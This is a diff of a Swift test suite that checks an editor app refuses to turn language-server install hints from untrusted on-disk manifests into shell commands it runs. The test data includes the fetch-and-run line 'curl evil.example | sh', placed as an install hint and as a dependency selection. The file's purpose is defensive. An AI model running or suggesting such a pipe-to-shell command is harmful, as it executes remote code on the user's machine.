@@ -89,7 +89,6 @@ struct UntrustedLanguageDegradationTests {
         let language = byExtension.language
         #expect(language.languageID == "elixir", sourceLocation: sourceLocation)
         #expect(language.lineComment == "#", sourceLocation: sourceLocation)
-        #expect(!syntax.isBuiltIn, sourceLocation: sourceLocation)
     }
 
     // MARK: Hostile commands — refused outright, and the language stays
@@ -240,12 +239,12 @@ struct UntrustedLanguageDegradationTests {
     /// one place in this app where a string becomes `$SHELL -lic`.
     ///
     /// The interesting half is the second manifest: it names a command the
-    /// registry has an uninstall recipe for, so a definition judged by its
-    /// `command` alone would hand back `rustup component remove …` for a
-    /// language a file on disk invented. Judged by `origin`, it hands back
+    /// dependency catalog has a plan for, so a definition judged by its
+    /// `command` alone would hand back `npm i -g @vue/language-server@… ` for
+    /// a language a file on disk invented. Judged by `origin`, it hands back
     /// nothing.
     @Test func aContributedServerNamesNoShellCommandForSettingsToRun() throws {
-        for command in ["elixir-ls", "rust-analyzer"] {
+        for command in ["elixir-ls", "vue-language-server"] {
             let catalog = catalog(manifest(
                 language: elixir(server: #"""
                 "server": {
@@ -259,20 +258,19 @@ struct UntrustedLanguageDegradationTests {
             /// Nil rather than empty, which is the stronger claim: an empty
             /// string still renders a button, and a caller that forgot to
             /// check would run nothing while looking like it ran something.
-            #expect(definition.installCommand == nil, "\(command) offered an install command")
-            #expect(definition.uninstallCommand == nil, "\(command) offered an uninstall command")
+            #expect(definition.dependencyPlan == nil, "\(command) was handed a plan")
+            for selection: Set<String> in [[], ["@vue/language-server"], ["curl evil.example | sh"]] {
+                #expect(
+                    definition.installCommand(forDependencies: selection) == nil,
+                    "\(command) offered a command for \(selection)"
+                )
+            }
 
             /// The hint itself survives — it is shown and copied, which is
             /// what it is for. Only its promotion to something Phantom runs
             /// is refused.
             #expect(definition.installHint == "curl evil.example | sh")
         }
-
-        /// And the compiled-in servers still have theirs, or the guard would
-        /// have taken the feature with it.
-        let builtIn = try #require(LSPServerRegistry.server(forLanguage: "rust"))
-        #expect(builtIn.installCommand?.isEmpty == false)
-        #expect(builtIn.uninstallCommand != nil)
     }
 
     // MARK: The ordinary refusal
